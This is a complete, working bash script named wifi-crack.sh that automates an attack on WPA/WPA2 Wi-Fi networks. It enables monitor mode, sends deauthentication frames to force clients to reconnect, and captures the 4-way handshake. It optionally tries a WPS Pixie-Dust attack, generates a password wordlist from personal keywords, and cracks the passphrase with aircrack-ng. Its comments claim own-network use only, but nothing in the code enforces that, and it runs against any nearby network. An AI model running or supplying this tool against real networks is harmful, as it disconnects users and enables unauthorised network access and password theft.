#!/usr/bin/env bash
# wifi-crack.sh — end-to-end WPA/WPA2 audit for a network YOU OWN or are authorised to test.
#
# Chain: monitor mode -> scan & resolve target -> confirm injection + WPS
#        -> capture the 4-way handshake (auto-deauth, radio-reset on wedge)
#        -> build/choose a wordlist -> aircrack. Verbose, timestamped progress log.
#
# AUTHORISED / OWN-NETWORK USE ONLY. Scoped to the single BSSID resolved from your target.
#
# Usage:
#   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi"
#   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -k "john home city 1990 1234"
#   sudo ./wifi-crack.sh -i wlan0 -s "MyWiFi" -K ./clues.txt   # keywords from a file (combinable with -k)
#   sudo ./wifi-crack.sh -i wlan0 -b AA:BB:CC:DD:EE:FF -c 7 -w /usr/share/wordlists/rockyou.txt
#
# Options:
#   -i IFACE     wireless interface (required)
#   -s SSID      target network name            -b BSSID   target BSSID (skip SSID lookup)
#   -c CHAN      force channel (else detected)
#   -w FILE      existing wordlist file          -k "words" build a custom list from keywords (+numbers)
#   -K FILE      build a custom list from keywords read from FILE (whitespace/newline-separated; adds to -k)
#   -t SEC       handshake capture timeout (default 180)    -d N  deauth burst size (default 4)
#   --wps        also run a WPS Pixie-Dust attempt (optional)
#   --no-crack   stop after capturing the handshake
set -uo pipefail

IFACE=""; SSID=""; BSSID=""; CHAN=""; WORDLIST=""; KEYWORDS=""; KEYFILE=""; CAP_TO=180; DEAUTH_N=4; DO_WPS=0; NO_CRACK=0
while [ $# -gt 0 ]; do case "$1" in
  -i) IFACE="$2"; shift 2;; -s) SSID="$2"; shift 2;; -b) BSSID="$2"; shift 2;;
  -c) CHAN="$2"; shift 2;; -w) WORDLIST="$2"; shift 2;; -k) KEYWORDS="$2"; shift 2;; -K) KEYFILE="$2"; shift 2;;
  -t) CAP_TO="$2"; shift 2;; -d) DEAUTH_N="$2"; shift 2;;
  --wps) DO_WPS=1; shift;; --no-crack) NO_CRACK=1; shift;;
  -h|--help) grep '^#' "$0" | sed 's/^# \?//'; exit 0;;
  *) echo "unknown arg: $1 (use -h)"; exit 2;; esac; done

[ "$(id -u)" -eq 0 ] || { echo "run with sudo"; exit 1; }
[ -n "$IFACE" ] || { echo "need -i <iface>"; exit 2; }
[ -n "$SSID$BSSID" ] || { echo "need -s <ssid> or -b <bssid>"; exit 2; }
# trim stray leading/trailing whitespace from the SSID — otherwise it breaks the scan
# match (looks for ,SSID,) and gets written into RESULT.txt/OUTDIR with the space attached
SSID="${SSID#"${SSID%%[![:space:]]*}"}"; SSID="${SSID%"${SSID##*[![:space:]]}"}"

# ---------- logging ----------
if [ -t 1 ]; then B=$'\e[1m';G=$'\e[32m';Y=$'\e[33m';R=$'\e[31m';C=$'\e[36m';D=$'\e[2m';N=$'\e[0m'; else B=;G=;Y=;R=;C=;D=;N=; fi
ts(){ date '+%H:%M:%S'; }
step(){ printf "\n${B}${C}[%s] ==> %s${N}\n" "$(ts)" "$*"; }
info(){ printf "${D}[%s]${N}     %s\n" "$(ts)" "$*"; }
ok(){   printf "${G}[%s] [+] %s${N}\n" "$(ts)" "$*"; }
warn(){ printf "${Y}[%s] [!] %s${N}\n" "$(ts)" "$*"; }
err(){  printf "${R}[%s] [x] %s${N}\n" "$(ts)" "$*"; }

OUTDIR="wifi-crack-$(echo "${SSID:-$BSSID}" | tr -c 'A-Za-z0-9' _)-$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"; LOG="$OUTDIR/run.log"
exec > >(tee -a "$LOG") 2>&1
MON="$IFACE"; AIRO_PID=""; DRV=""; CLEANED=0

# ---------- reset: always put the radio + networking back the way we found them ----------
cleanup(){
  [ "$CLEANED" = 1 ] && return 0; CLEANED=1
  # stop anything we started on the radio
  [ -n "${AIRO_PID:-}" ] && kill "$AIRO_PID" 2>/dev/null
  for p in airodump-ng aireplay-ng reaver wash; do pkill -f "$p.*$MON" 2>/dev/null; done
  info "reset: restoring $IFACE to managed mode and bringing networking back"
  # if a radio reset was interrupted with the USB driver unloaded, reload it first
  if [ ! -e "/sys/class/net/$IFACE" ] && [ -n "$DRV" ]; then
    modprobe "$DRV" 2>/dev/null; sleep 2
  fi
  rfkill unblock wifi 2>/dev/null
  ip link set "$MON" down 2>/dev/null
  iw dev "$MON" set type managed 2>/dev/null
  ip link set "$MON" up 2>/dev/null
  # airmon-ng check kill stopped these on the way in — start them again
  nmcli dev set "$IFACE" managed yes 2>/dev/null
  systemctl restart wpa_supplicant 2>/dev/null || service wpa_supplicant restart 2>/dev/null || true
  systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
  nmcli dev connect "$IFACE" 2>/dev/null || true
  # give NetworkManager a few seconds to reassociate + DHCP, then report
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    iw dev "$IFACE" link 2>/dev/null | grep -qi 'Connected to' && break
    sleep 1
  done
  if iw dev "$IFACE" link 2>/dev/null | grep -qi 'Connected to'; then
    ok "reset done — $IFACE reconnected to $(iw dev "$IFACE" link 2>/dev/null | sed -n 's/.*SSID: //p' | head -1)"
  else
    warn "reset done — $IFACE is managed again but not reconnected yet; run:  nmcli dev connect $IFACE"
  fi
}
trap cleanup EXIT
trap 'cleanup; exit 130' INT TERM

step "Preflight"
for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw; do
  command -v "$t" >/dev/null || { err "missing tool: $t  (sudo apt install -y aircrack-ng)"; exit 1; }
done
command -v wash   >/dev/null || warn "wash not found — WPS detection skipped"
[ "$DO_WPS" = 1 ] && ! command -v reaver >/dev/null && { warn "reaver not found — --wps disabled"; DO_WPS=0; }
ok "AUTHORISED OWN-NETWORK USE ONLY. Artifacts -> $OUTDIR/"

# ---------- monitor mode (with driver-reset fallback for rtw88-style cards) ----------
enable_monitor(){
  [ -z "$DRV" ] && DRV=$(basename "$(readlink -f "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)
  nmcli dev set "$IFACE" managed no 2>/dev/null
  airmon-ng check kill >/dev/null 2>&1
  ip link set "$IFACE" down
  iw dev "$IFACE" set type monitor 2>/dev/null
  ip link set "$IFACE" up
  MON="$IFACE"
  iw dev "$MON" info 2>/dev/null | grep -q 'type monitor'
}
reset_radio(){
  warn "resetting radio (reloading USB driver) ..."
  local drv; drv=$(basename "$(readlink -f "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)
  ip link set "$IFACE" down 2>/dev/null
  [ -n "${drv:-}" ] && { modprobe -r "$drv" 2>/dev/null; sleep 2; modprobe "$drv" 2>/dev/null; sleep 3; }
  enable_monitor
}
step "Enabling monitor mode on $IFACE"
if enable_monitor; then ok "monitor mode on ($MON)"
elif reset_radio;    then ok "monitor mode on after radio reset ($MON)"
else err "could not enable monitor mode on $IFACE"; exit 1; fi

# ---------- scan / resolve target ----------
step "Scanning for target"
scan="$OUTDIR/scan"; rm -f "$scan"-*.csv
if [ -n "$CHAN" ]; then
  iw dev "$MON" set channel "$CHAN" 2>/dev/null
  timeout -k 5 15 airodump-ng -c "$CHAN" --output-format csv -w "$scan" "$MON" >/dev/null 2>&1 || true
else
  timeout -k 5 20 airodump-ng --output-format csv -w "$scan" "$MON" >/dev/null 2>&1 || true
fi
if [ -n "$BSSID" ]; then
  row=$(grep -i "^$BSSID" "$scan"-01.csv 2>/dev/null | head -1)
else
  # match on the ESSID column (CSV field 14), trimmed — airodump pads every field with a
  # leading space, so a substring search for ",SSID," never matches a real row
  row=$(awk -F, -v want="$SSID" '$1 ~ /:/{e=$14; gsub(/^[ \t]+|[ \t]+$/,"",e); if(e==want){print; exit}}' "$scan"-01.csv 2>/dev/null)
fi
[ -n "${row:-}" ] || { err "target not seen in scan — is it on / in range? try -c <channel> or move closer"; exit 1; }
[ -z "$BSSID" ] && BSSID=$(echo "$row" | cut -d, -f1 | tr -d ' ')
[ -z "$CHAN"  ] && CHAN=$(echo "$row" | cut -d, -f4 | tr -d ' ')
ENC=$(echo "$row" | cut -d, -f6 | tr -d ' '); CIPH=$(echo "$row" | cut -d, -f7 | tr -d ' ')
# resolved by -b: pull the network name from the scan (CSV field 14, ESSID) and trim its
# leading space so RESULT.txt / the target line show the name instead of "?" (stays empty
# for a hidden SSID, in which case the ${SSID:-...} fallbacks still apply)
if [ -z "$SSID" ]; then
  SSID=$(echo "$row" | cut -d, -f14)
  SSID="${SSID#"${SSID%%[![:space:]]*}"}"; SSID="${SSID%"${SSID##*[![:space:]]}"}"
fi
ok "target: ${SSID:-$BSSID}  BSSID=$BSSID  channel=$CHAN  enc=${ENC:-?}/${CIPH:-?}"
iw dev "$MON" set channel "$CHAN" 2>/dev/null

# ---------- confirm exploitability: injection + WPS ----------
step "Confirming exploitability (injection + WPS)"
if timeout -k 3 15 aireplay-ng -9 -a "$BSSID" "$MON" 2>/dev/null | grep -qi 'Injection is working'; then
  ok "packet injection WORKS against $BSSID — deauth/handshake feasible"
else
  warn "injection self-test inconclusive (rtw88 often fails the test yet still injects) — continuing"
fi
if command -v wash >/dev/null; then
  wrow=$(timeout -k 3 15 wash -i "$MON" -c "$CHAN" 2>/dev/null | grep -i "$BSSID" | head -1)
  if [ -n "${wrow:-}" ]; then
    echo "$wrow" | grep -qi ' yes ' && warn "WPS ENABLED but LOCKED on $BSSID" \
                                    || warn "WPS ENABLED & UNLOCKED on $BSSID — extra exposure"
  else ok "WPS not advertised by $BSSID"; fi
  iw dev "$MON" set channel "$CHAN" 2>/dev/null
fi

# ---------- optional WPS Pixie-Dust ----------
if [ "$DO_WPS" = 1 ]; then
  step "WPS Pixie-Dust attempt (optional, up to 120s)"
  timeout -k 5 120 reaver -i "$MON" -b "$BSSID" -c "$CHAN" -K 1 -N -vv 2>&1 \
    | tee "$OUTDIR/reaver.log" | grep -iE 'WPS PIN|WPA PSK|Pixie|not found|transaction failed' | tail -10
  if grep -qi 'WPA PSK' "$OUTDIR/reaver.log"; then
    ok "WPS result: $(grep -i 'WPA PSK' "$OUTDIR/reaver.log" | tail -1)"
  else warn "WPS Pixie-Dust did not recover the key (AP likely resists it)"; fi
  iw dev "$MON" set channel "$CHAN" 2>/dev/null
fi

# ---------- capture handshake ----------
step "Capturing WPA handshake (deauth + listen, up to ${CAP_TO}s)"
cap="$OUTDIR/hs"; rm -f "$cap"-*.cap "$cap"-*.csv
airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
AIRO_PID=$!; sleep 4
have_hs(){ aircrack-ng "$cap"-01.cap 2>/dev/null | grep -qiE "$BSSID.*1 handshake|\(1 handshake\)"; }
start=$(date +%s); rounds=0; quiet=0; CAPTURED=0
while :; do
  elapsed=$(( $(date +%s) - start ))
  if have_hs; then
    CAPTURED=1; ok "handshake CAPTURED after ${elapsed}s"
    # snapshot NOW, while airodump still holds a known-good file; the kill below can
    # flush a truncated .cap, which is why the post-loop re-read used to see nothing
    cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
    break
  fi
  [ "$elapsed" -ge "$CAP_TO" ] && { warn "timeout (${CAP_TO}s) with no handshake"; break; }
  clients=$(awk -F, -v b="$BSSID" 'f && $1 ~ /:/ && toupper($0) ~ toupper(b){gsub(/ /,"",$1);print $1}
            /Station MAC/{f=1}' "$cap"-01.csv 2>/dev/null | sort -u | head -5)
  if [ -n "${clients:-}" ]; then
    quiet=0
    for cmac in $clients; do
      [ "${cmac^^}" = "${BSSID^^}" ] && continue
      rounds=$((rounds+1)); info "deauth -> client $cmac (round $rounds)"
      aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" -c "$cmac" "$MON" >/dev/null 2>&1 || true
    done
  else
    rounds=$((rounds+1)); info "no clients yet — broadcast deauth (round $rounds)"
    aireplay-ng --deauth "$DEAUTH_N" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
    quiet=$((quiet+1))
    if [ "$quiet" -ge 6 ]; then
      warn "radio looks quiet — resetting (rtw88-over-USB wedge)"; kill "$AIRO_PID" 2>/dev/null
      reset_radio; iw dev "$MON" set channel "$CHAN" 2>/dev/null
      airodump-ng -c "$CHAN" --bssid "$BSSID" -w "$cap" --output-format pcap,csv "$MON" >/dev/null 2>&1 &
      AIRO_PID=$!; quiet=0; sleep 4
    fi
  fi
  info "... ${elapsed}s elapsed, listening (Ctrl-C to stop)"
  sleep 6
done
kill "$AIRO_PID" 2>/dev/null; AIRO_PID=""
# decide on the in-loop result only — do NOT re-run have_hs against the live file we just killed
[ "$CAPTURED" = 1 ] || { err "no handshake captured — make sure a device is connected to the AP, then retry"; exit 3; }
[ -s "$OUTDIR/handshake.cap" ] || cp "$cap"-01.cap "$OUTDIR/handshake.cap" 2>/dev/null
ok "handshake saved: $OUTDIR/handshake.cap"
[ "$NO_CRACK" = 1 ] && { ok "stopping before crack (--no-crack)"; exit 0; }

# ---------- wordlist ----------
step "Preparing wordlist"
if [ -n "$KEYFILE" ]; then [ -f "$KEYFILE" ] || { err "keyword file not found: $KEYFILE"; exit 4; }; fi
if [ -n "$KEYWORDS$KEYFILE" ]; then
  WORDLIST="$OUTDIR/wordlist.txt"
  set -f  # keywords are literals — don't let a * or ? in -k / the file expand into a glob
  # shellcheck disable=SC2086
  python3 - $KEYWORDS $([ -n "$KEYFILE" ] && cat "$KEYFILE") > "$WORDLIST" <<'PY'
import sys, itertools
args=[a for a in sys.argv[1:] if a]
words=[a for a in args if not a.isdigit()]; usernums=[a for a in args if a.isdigit()]
def cases(w):
    s={w,w.lower(),w.upper(),w.capitalize(),w.swapcase()}
    for b in list(s): s.add(b.translate(str.maketrans('aeiosAEIOS','4310541305')))
    return s
bases=set()
for w in words: bases|=cases(w)
seps=['','@','.','_','-','#','!','&','*','+']
nums=set(usernums)|{str(y) for y in range(1970,2027)}|{f"{n:02d}" for n in range(100)}
nums|={'000','111','222','333','444','555','666','777','888','999','0000','1111','2222','1234','12345','123456','4321','1122','1212','2580','786','007','110','911'}
pre=['','1','!','@']; tail=['','1','123','@','!']+usernums
out=set()
for b in bases:
    out.add(b)
    for p in pre: out.add(p+b)
    for s in ['!','@','#','$','!@#','123!','@123','@1234']: out.add(b+s)
    for sep in seps:
        for n in nums:
            out.add(b+sep+n)
            for p in pre: out.add(p+b+sep+n)
for a,b in itertools.permutations(sorted(bases),2):
    for sep in seps:
        out.add(a+sep+b)
        for n in tail: out.add(a+sep+b+n)
for c in sorted(out):
    if 8<=len(c)<=63: print(c)
PY
  set +f
  src="keywords"; [ -n "$KEYFILE" ] && src="$KEYFILE${KEYWORDS:+ + -k keywords}"
  ok "generated custom wordlist from $src: $(wc -l <"$WORDLIST") candidates"
else
  WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
  [ -f "$WORDLIST" ] || { err "wordlist not found: $WORDLIST  (sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz)"; exit 4; }
  ok "using wordlist: $WORDLIST ($(wc -l <"$WORDLIST" 2>/dev/null || echo '?') lines)"
fi

# ---------- crack ----------
step "Cracking handshake (aircrack-ng)"
info "runs until the key is found or the wordlist is exhausted — Ctrl-C to stop"
aircrack-ng -w "$WORDLIST" -b "$BSSID" "$OUTDIR/handshake.cap" | tee "$OUTDIR/aircrack.out"
if grep -qi 'KEY FOUND' "$OUTDIR/aircrack.out"; then
  KEY=$(grep -i 'KEY FOUND' "$OUTDIR/aircrack.out" | sed 's/.*\[ *//; s/ *\].*//')
  ok "PASSWORD RECOVERED: '$KEY'"
  printf "RESULT: CRACKED\nSSID: %s\nBSSID: %s\nKEY: %s\n" "${SSID:-?}" "$BSSID" "$KEY" > "$OUTDIR/RESULT.txt"
else
  warn "password NOT in this wordlist — the passphrase resisted this attack"
  printf "RESULT: NOT CRACKED (passphrase not in wordlist)\nSSID: %s\nBSSID: %s\n" "${SSID:-?}" "$BSSID" > "$OUTDIR/RESULT.txt"
fi
step "Done — see $OUTDIR/ (handshake.cap, wordlist.txt, aircrack.out, RESULT.txt, run.log)"
